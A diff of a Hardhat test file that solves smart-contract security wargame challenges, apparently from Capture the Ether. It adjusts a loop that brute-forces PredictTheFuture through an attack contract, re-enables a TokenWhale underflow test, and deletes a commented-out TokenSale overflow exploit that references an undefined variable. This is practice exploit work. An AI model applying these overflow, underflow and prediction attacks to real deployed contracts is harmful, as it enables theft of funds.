@@ -138,12 +138,15 @@ describe("Tests", function () {
         value: ethers.utils.parseEther("1"),
       });
 
-      while (await ptf.isComplete()) {
-        await attack.guess(guessN, { gasLimit: 50000 });
+      while (!(await ptf.isComplete())) {
+        console.log("trigger1");
+
+        await attack.guess(guessN, { gasLimit: 500000 });
+        console.log("trigger");
       }
 
       expect(await ptf.isComplete()).to.equal(true);
-    });
+    }).timeout(5000000000);
   });
 
   describe("PredictsTheBlockHash", () => {
@@ -195,7 +198,7 @@ describe("Tests", function () {
   });
 
   describe("TokenWhale", () => {
-    it.only("Tricks the contract to underflow", async () => {
+    it("Tricks the contract to underflow", async () => {
       const [mainAcc, altAcc] = await ethers.getSigners();
 
       const TW = await ethers.getContractFactory("TokenWhaleChallenge");
@@ -216,22 +219,6 @@ describe("Tests", function () {
   });
 
   //FIX TOKEN BANK AND PREDICT THE FUTURE
-
-  // describe("TokenSale", () => {
-  //   it("Gets more tokens than it should", async () => {
-  //     const maxIntAnd1 =
-  //       "115792089237316195423570985008687907853269984665640564039459";
-  //     const TS = await ethers.getContractFactory("TokenSaleChallenge");
-
-  //     const ts = await TS.deploy({ value: ethers.utils.parseEther("1") });
-
-  //     await ts.buy(maxIntAnd1, { value: overflowed, gasLimit: 50000 });
-
-  //     await ts.sell(1);
-
-  //     expect(await ts.isComplete()).to.equal(true);
-  //   });
-  // });
 
   describe("TokenBankChallenge", () => {
     it("Solves the challenge", async () => {
